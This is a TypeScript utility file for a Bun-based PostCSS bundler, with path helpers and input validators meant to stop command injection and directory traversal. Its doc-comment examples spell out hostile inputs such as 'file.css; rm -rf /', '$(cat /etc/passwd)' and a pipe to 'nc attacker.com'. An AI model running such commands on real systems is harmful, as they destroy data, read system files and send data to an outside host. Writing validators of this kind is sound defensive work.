import path from "path";
import postcss, { Processor } from "postcss";
import { BunPostCSSBundlerResult } from "./types";

export function getOutfileAbsolutePath(outfile: string) {
  return path.isAbsolute(outfile)
    ? outfile
    : path.resolve(process.cwd(), outfile);
}

export function getGlob(input: string | Bun.Glob): Bun.Glob {
  return typeof input === "string" ? new Bun.Glob(input) : input;
}

export function createPostCSSResult(
  processor: Processor,
  css: string[],
  outfile?: string,
  input?: string
): BunPostCSSBundlerResult {
  const joined = css.join("\n");
  return {
    messages: [],
    lastPlugin: {} as postcss.Plugin,
    map: {} as postcss.SourceMap,
    root: {} as postcss.Root,
    warnings() {
      return [];
    },
    warn(message, options) {
      return {} as postcss.Warning;
    },

    processor,
    opts: {
      to: outfile || '<inline>',
      from: input || "<inline>",
    },
    content: joined,
    css: joined,
    toString() {
      return joined;
    },
  };
}

/**
 * Checks if a string contains characters that could be used for command injection.
 *
 * This function validates file paths and shell arguments to prevent command injection attacks.
 * It blocks common shell metacharacters that could be used to chain commands, redirect output,
 * or execute arbitrary code.
 *
 * @param input - The string to validate
 * @returns true if the input contains malicious characters, false otherwise
 *
 * @example
 * ```ts
 * // Safe inputs
 * hasMaliciousCharacters("./styles.css") // false
 * hasMaliciousCharacters("dist/output.css") // false
 * hasMaliciousCharacters("../parent/file.css") // false
 *
 * // Dangerous inputs
 * hasMaliciousCharacters("file.css; rm -rf /") // true
 * hasMaliciousCharacters("$(cat /etc/passwd)") // true
 * hasMaliciousCharacters("file.css && malicious") // true
 * hasMaliciousCharacters("file.css | nc attacker.com") // true
 * ```
 */
export function hasMaliciousCharacters(input: string): boolean {
  // List of dangerous shell metacharacters and patterns
  const dangerousPatterns = [
    ';',      // Command separator
    '|',      // Pipe operator
    '&',      // Background operator / command chaining
    '$(',     // Command substitution
    '`',      // Command substitution (backticks)
    '>',      // Output redirection
    '<',      // Input redirection
    '\n',     // Newline (command separator)
    '\r',     // Carriage return
    '\\x',    // Hex escape sequences
    '${',     // Variable expansion
    '*',      // Glob pattern (could be abused)
    '?',      // Glob pattern (could be abused)
    '[',      // Glob pattern (could be abused)
  ];

  return dangerousPatterns.some(pattern => input.includes(pattern));
}

/**
 * Validates and sanitizes a file path for use in shell commands.
 *
 * This function ensures that file paths are safe to use in shell commands by:
 * 1. Checking for malicious characters
 * 2. Resolving the path to prevent directory traversal attacks
 * 3. Optionally validating the path is within an allowed directory
 *
 * @param filePath - The file path to validate
 * @param allowedBaseDir - Optional base directory that the path must be within
 * @throws Error if the path contains malicious characters or is outside the allowed directory
 * @returns The resolved absolute path if valid
 *
 * @example
 * ```ts
 * // Valid paths
 * validateShellPath("./styles.css") // Returns absolute path
 * validateShellPath("dist/output.css", process.cwd()) // OK if within cwd
 *
 * // Invalid paths
 * validateShellPath("file.css; rm -rf /") // Throws: contains malicious characters
 * validateShellPath("../../../etc/passwd", "/home/user/project") // Throws: outside allowed directory
 * ```
 */
export function validateShellPath(filePath: string, allowedBaseDir: string = "./"): string {
  if (hasMaliciousCharacters(filePath)) {
    throw new Error(
      `Invalid file path: "${filePath}" contains potentially malicious characters`
    );
  }

  const resolvedPath = path.resolve(filePath);

  if (allowedBaseDir) {
    const resolvedBase = path.resolve(allowedBaseDir);
    if (!resolvedPath.startsWith(resolvedBase)) {
      throw new Error(
        `Invalid file path: "${filePath}" is outside the allowed directory "${allowedBaseDir}"`
      );
    }
  }

  return resolvedPath;
}